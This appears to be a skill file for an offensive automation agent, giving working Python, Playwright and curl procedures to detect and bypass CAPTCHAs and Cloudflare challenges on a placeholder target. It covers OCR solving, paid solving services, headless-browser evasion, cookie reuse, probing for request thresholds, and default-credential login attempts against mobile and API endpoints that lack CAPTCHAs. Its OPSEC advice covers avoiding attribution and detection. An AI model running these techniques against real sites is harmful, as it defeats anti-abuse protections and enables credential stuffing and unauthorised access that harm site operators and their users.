---
name: evasion-captcha-bypass
description: Detect, classify, and bypass CAPTCHA and JavaScript challenge walls that block automated access
version: 1.0.0
phase: recon
category: evasion
tags: [captcha, bypass, challenge, automation]
tools: [curl, python3, tesseract]
difficulty: advanced
opsec_level: covert
time_estimate: 5m
severity_if_found: info
related_skills:
  - evasion-human-imitation
  - evasion-detection-test
  - stealth-browser
mitre_attack:
  - T1595
  - T1059
---

## When to Use

Use this skill when the target presents a CAPTCHA, JavaScript challenge (Cloudflare "Just a moment", "Checking your browser"), or interactive challenge that blocks automated requests. CAPTCHAs are the most common gate before rate limiting kicks in. This skill covers CAPTCHA type detection, OCR solving, API-based solving services, reCAPTCHA bypass, Cloudflare Turnstile bypass, and rate-based avoidance to minimize challenge triggers.

## Prerequisites

- curl, python3 with `requests`, `PIL` (Pillow), `pytesseract` modules
- tesseract-ocr installed (`apt install tesseract-ocr`)
- For API-based solving: 2captcha, capsolver, or Anti-Captcha API key
- For browser-based challenges: playwright or puppeteer installed
- Understanding of when CAPTCHAs trigger (from evasion-detection-test)

## Procedure

```bash
# 1. CAPTCHA TYPE DETECTION
# Classify what kind of challenge we're facing before choosing bypass technique

# Download the page and analyze challenge type
curl -sk https://TARGET/login -o /tmp/captcha_page.html

python3 << 'EOF'
import re

with open("/tmp/captcha_page.html", "r") as f:
    html = f.read()

indicators = {
    "reCAPTCHA v2": ["recaptcha/api.js", "g-recaptcha", "data-sitekey"],
    "reCAPTCHA v3": ["recaptcha/api.js?render=", "grecaptcha.execute"],
    "hCaptcha": ["hcaptcha.com/1/api.js", "h-captcha", "data-hcaptcha"],
    "Cloudflare Turnstile": ["turnstile.js", "cf-turnstile", "challenges.cloudflare.com"],
    "Cloudflare JS Challenge": ["cdn-cgi/challenge-platform", "cf_challenge_response"],
    "Text CAPTCHA": ["captcha.php", "simple_captcha", "captcha_image"],
    "Image CAPTCHA": ["image_captcha", "captcha.png", "captcha.jpg"],
    "Audio CAPTCHA": ["audio_captcha", "captcha.mp3", "captcha.wav"],
    "Akamai BOTMAN": ["akamai.com/botman", "bm-verify"],
    "PerimeterX": ["perimeterx.com", "px-captcha"],
}

detected = []
for challenge_type, patterns in indicators.items():
    for pattern in patterns:
        if pattern in html:
            detected.append(challenge_type)
            break

if detected:
    for d in set(detected):
        print(f"✓ Detected: {d}")
else:
    print("✗ Unknown CAPTCHA type — inspect page manually")

# Extract sitekey for API-based solving
import re
sitekey_match = re.search(r'data-sitekey=["\']([^"\']+)["\']', html)
if sitekey_match:
    print(f"Sitekey: {sitekey_match.group(1)}")

turnstile_match = re.search(r'data-sitekey=["\']([^"\']+)["\']', html)
if turnstile_match:
    print(f"Turnstile Sitekey: {turnstile_match.group(1)}")
EOF

# 2. TEXT CAPTCHA SOLVING WITH TESSERACT OCR
# For simple text-based CAPTCHAs (distorted text in image)

# Download captcha image
curl -sk "https://TARGET/captcha.php" -o /tmp/captcha.png

# Preprocess and OCR
python3 << 'EOF'
from PIL import Image, ImageFilter, ImageEnhance
import pytesseract
import requests

# Load and preprocess image
img = Image.open("/tmp/captcha.png")

# Convert to grayscale
img = img.convert("L")

# Increase contrast
enhancer = ImageEnhance.Contrast(img)
img = enhancer.enhance(2.0)

# Apply threshold filter
img = img.point(lambda x: 0 if x < 140 else 255)

# Remove noise (median filter)
img = img.filter(ImageFilter.MedianFilter(3))

# Save preprocessed image for debugging
img.save("/tmp/captcha_processed.png")

# OCR with different configurations
configs = [
    "--psm 8 --oem 3 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
    "--psm 7 --oem 3",
    "--psm 13 --oem 3",
    "-c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
]

for config in configs:
    try:
        text = pytesseract.image_to_string(img, config=config).strip()
        if text:
            print(f"OCR ({config[:20]}...): '{text}'")
    except:
        pass
EOF

# 3. CAPTCHA SOLVING SERVICES API (for production use)
# Use 2captcha / capsolver / Anti-Captcha for reliable solving

# 2captcha API
python3 << 'EOF'
import requests
import time
import base64

API_KEY = "YOUR_2CAPTCHA_API_KEY"
SITE_KEY = "SITE_KEY_FROM_STEP_1"
PAGE_URL = "https://TARGET/login"

# Step 1: Submit captcha to solving service
resp = requests.post("https://2captcha.com/in.php", data={
    "key": API_KEY,
    "method": "userrecaptcha",
    "googlekey": SITE_KEY,
    "pageurl": PAGE_URL,
    "json": 1,
})
request_data = resp.json()
if request_data.get("status") != 1:
    print(f"Failed to submit: {request_data}")
    exit(1)

captcha_id = request_data["request"]
print(f"CAPTCHA submitted. ID: {captcha_id}")

# Step 2: Poll for solution
for attempt in range(30):
    time.sleep(5)
    resp = requests.get("https://2captcha.com/res.php", params={
        "key": API_KEY,
        "action": "get",
        "id": captcha_id,
        "json": 1,
    })
    result = resp.json()
    if result.get("status") == 1:
        token = result["request"]
        print(f"CAPTCHA solved: {token[:40]}...")
        break
    print(f"  Waiting... ({attempt + 1}/30)")

# Step 3: Use token to submit form
session = requests.Session()
# Get login page to capture any additional tokens/cookies
login_page = session.get(PAGE_URL, timeout=10)

# Submit form with CAPTCHA token
form_data = {
    "username": "test",
    "password": "test",
    "g-recaptcha-response": token,
}
resp = session.post(PAGE_URL, data=form_data, timeout=10)
print(f"Form submission: HTTP {resp.status_code}")
EOF

# 4. reCAPTCHA v2 AUDIO SOLVING
# reCAPTCHA v2 audio challenges are easier to solve than image ones

python3 << 'EOF'
import requests

API_KEY = "YOUR_2CAPTCHA_API_KEY"
SITE_KEY = "SITE_KEY_FROM_STEP_1"
PAGE_URL = "https://TARGET/login"

# Submit as audio captcha
resp = requests.post("https://2captcha.com/in.php", data={
    "key": API_KEY,
    "method": "userrecaptcha",
    "googlekey": SITE_KEY,
    "pageurl": PAGE_URL,
    "json": 1,
    "recaptchav3": "audio",  # Request audio challenge
})
print(f"Audio captcha submitted: {resp.json()}")
EOF

# 5. CLOUDFLARE JS CHALLENGE BYPASS (Turnstile / "Just a moment")
# Cloudflare JS challenges require JavaScript execution — use playwright

# Install playwright: pip install playwright && playwright install chromium

python3 << 'EOF'
import asyncio
from playwright.async_api import async_playwright
import time

async def bypass_cloudflare():
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=[
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
                "--disable-dev-shm-usage",
            ]
        )

        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            viewport={"width": 1920, "height": 1080},
            locale="en-US",
            timezone_id="America/New_York",
        )

        page = await context.new_page()

        # Navigate and wait for challenge to resolve
        try:
            await page.goto("https://TARGET", wait_until="networkidle", timeout=60000)
            await page.wait_for_timeout(5000)

            # Check if challenge page is gone
            content = await page.content()
            if "cf-browser-verification" in content or "cdn-cgi" in content:
                print("⚠ Cloudflare challenge still present")
            else:
                print("✓ Cloudflare challenge bypassed")

            # Extract cookies for reuse
            cookies = await context.cookies()
            for cookie in cookies:
                if "cf_" in cookie["name"]:
                    print(f"Cloudflare cookie: {cookie['name']}={cookie['value'][:20]}...")

            # Save cookies for curl reuse
            with open("/tmp/cf_cookies.json", "w") as f:
                import json
                json.dump(cookies, f)

        except Exception as e:
            print(f"Failed: {e}")
        finally:
            await browser.close()

asyncio.run(bypass_cloudflare())
EOF

# 6. SESSION REUSE TO AVOID REPEATED CHALLENGES
# Once a CAPTCHA is solved, reuse the session to avoid re-triggering

# Extract cookies from playwright output and reuse with curl
curl -sk https://TARGET \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -b "/tmp/cf_cookies.json" 2>/dev/null || \
curl -sk https://TARGET \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -H "Cookie: cf_clearance=YOUR_CF_TOKEN; __cf_bm=YOUR_BM_TOKEN" 2>/dev/null

# 7. RATE-BASED CHALLENGE AVOIDANCE
# CAPTCHAs often trigger after a request threshold — stay below it

python3 << 'EOF'
import requests
import time
import random

target = "https://TARGET/api/endpoint"
headers = {"User-Agent": "Mozilla/5.0"}

# Find the CAPTCHA trigger threshold
for i in range(1, 31):
    resp = requests.get(target, headers=headers, timeout=10)
    has_captcha = "captcha" in resp.text.lower() or "cf-browser-verification" in resp.text

    print(f"Request {i}: HTTP {resp.status_code} {'⚠ CAPTCHA' if has_captcha else '✓ OK'}")

    if has_captcha:
        print(f"CAPTCHA triggered at request {i}")
        # Wait for cooldown — CAPTCHA state is often time-based (60-300s)
        cooldown = 120 + random.randint(0, 60)
        print(f"Cooling down for {cooldown}s...")
        time.sleep(cooldown)
        break

    time.sleep(random.uniform(2.0, 4.0))
EOF

# 8. HEADLESS BROWSER WITH CAPTCHA-CLICK AUTOMATION
# For challenges requiring click interaction (hCaptcha, reCAPTCHA checkbox)

python3 << 'EOF'
import asyncio
from playwright.async_api import async_playwright
import random

async def solve_click_captcha():
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()

        await page.goto("https://TARGET/login", wait_until="networkidle")

        # Wait for CAPTCHA iframe
        try:
            # reCAPTCHA checkbox
            recaptcha_frame = page.frame_locator("iframe[src*='recaptcha']")
            await recaptcha_frame.locator(".recaptcha-checkbox-border").click(timeout=10000)
            print("✓ reCAPTCHA checkbox clicked")

            # Wait for verification
            await page.wait_for_timeout(3000)

            # Check for image selection challenge
            challenge_frame = page.frame_locator("iframe[title*='recaptcha challenge']")
            if await challenge_frame.locator("body").is_visible():
                print("⚠ Image challenge detected — needs API-based solving")
                # Fall back to API-based solving for image challenges

        except Exception as e:
            print(f"No reCAPTCHA detected: {e}")

        # hCaptcha handling
        try:
            hcaptcha_iframe = page.frame_locator("iframe[src*='hcaptcha']")
            await hcaptcha_iframe.locator("#checkbox").click(timeout=5000)
            print("✓ hCaptcha checkbox clicked")
        except:
            pass

        await browser.close()

asyncio.run(solve_click_captcha())
EOF

# 9. DIRECT API AVOIDANCE
# CAPTCHAs are often only on web pages — try direct API access

# Bypass CAPTCHA poster page and hit API directly
curl -sk "https://TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "admin123"}'

curl -sk "https://TARGET/api/v2/auth/token" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "admin123"}'

# Mobile API endpoints often lack CAPTCHA
curl -sk "https://TARGET/mobile-api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "admin123"}'
```

## OPSEC Rules

- CAPTCHA solving services log every request — do NOT use them against targets where attribution is a concern
- Text OCR solving has a 30-60% success rate — use API services for production bypasses (>90% success rate)
- Cloudflare JS challenges MUST be solved with a real browser — curl/nmap cannot bypass them
- CAPTCHA state is session-bound — reuse cookies/session tokens to avoid re-solving
- API-based bypass attempts (direct API calls) are logged separately from web CAPTCHA events — use them sparingly
- Solving CAPTCHAs in rapid succession creates a behavioral detection signal — wait 10-30s between solves

## Verification

- Confirm CAPTCHA bypass by successfully submitting a form or accessing a gated endpoint
- Verify the bypass is reproducible (at least 3 consecutive successful solutions)
- Cross-check bypass from a different IP — if CAPTCHA re-appears, it's IP-bound rather than session-bound
- For OCR-based solving: manually verify the solved text against the original CAPTCHA image

## Pitfalls

- reCAPTCHA v3 does NOT present a visual challenge — it returns a score (0.0-1.0) and you must test different behavior patterns to increase the score
- Cloudflare Turnstile is invisible and adaptive — headless browsers are detected by client-side JS challenges
- Audio CAPTCHA solving has largely been deprecated by Google — focus on image/API-based solving
- Session reuse duration varies: Cloudflare cookies expire after 30-120 minutes (depending on security level)
- OCR accuracy drops significantly on CAPTCHAs with lines, curves, or overlapping characters — pre-processing is essential
- Some CAPTCHAs are honeypots — solving them confirms you're a bot (the site has no actual CAPTCHA verification)

## Output Format

```json
{
  "skill": "evasion-captcha-bypass",
  "target": "TARGET",
  "captcha_type": "recaptcha_v2 | hcaptcha | cloudflare_turnstile | text_captcha",
  "sitekey": "6Lc...",
  "solving_method": "ocr | api_service | browser_automation | api_avoidance",
  "success_rate": 0.92,
  "avg_solve_time_seconds": 12.5,
  "session_cookie": "cf_clearance=abc123...",
  "trigger_threshold": 15,
  "notes": "Captcha triggers after 15 requests/minute. Session reuse works for 30 minutes."
}
```
